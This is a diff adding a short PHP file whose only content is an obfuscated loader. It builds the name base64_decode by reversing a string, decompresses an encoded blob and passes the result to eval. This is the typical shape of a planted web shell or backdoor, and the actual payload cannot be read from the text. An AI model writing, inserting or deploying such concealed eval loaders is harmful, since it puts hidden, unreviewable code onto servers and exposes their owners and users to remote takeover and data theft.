@@ -1,0 +1,4 @@
+<?php /*obfv1*/
+
+
+$_F=__FILE__;$_X="eJytUkFrwjAYvQv7DzkIbQVxeuzWioobwjpBZR5D2nzVbGlS0nROZP99aeKoeBkM6SV8ee/lvddvHD+Oy32JBj2Z5p/D3uCuk3FSVWj+pUHQA1GwEBqUIBzPtzOpAE+5zD7whBZM7HXBcSJpzQE/K0bxhqTusDJkUKDw5lgCAitWoYTs4ILplLaM7kA72kzyuhAte5JpJgU6obJOOctQXgs3URbhvxHFQOBl+g6ZRl18HxhsFw9RZN8KQ6O8ZmLHQUvhe3DITIJBYR17QT/mklDf0PqxAS4oCM1yZnSD4AGxHJmrYT9mVVuGH6AoipBWNSAiKDoDnqRKCBNrpn8ROeEVNG4uZF5YBqICeiHi/I6MX4sxLs4g3zhQoGsl/k6CueNgSjTBsmwawtoU30RsJEkKfHpc2gtjZmSnCWjiO0Dzk2zmb/OdX/VepSoI9+xw7Nak04ShkDNhQnhtK2F7/P+WhCs4KFOgd1Xg9T7eYA9vutynprQfgaoqCg==";$_D=strrev("edoced" . "_46esab");eval(gzuncompress($_D($_X)));
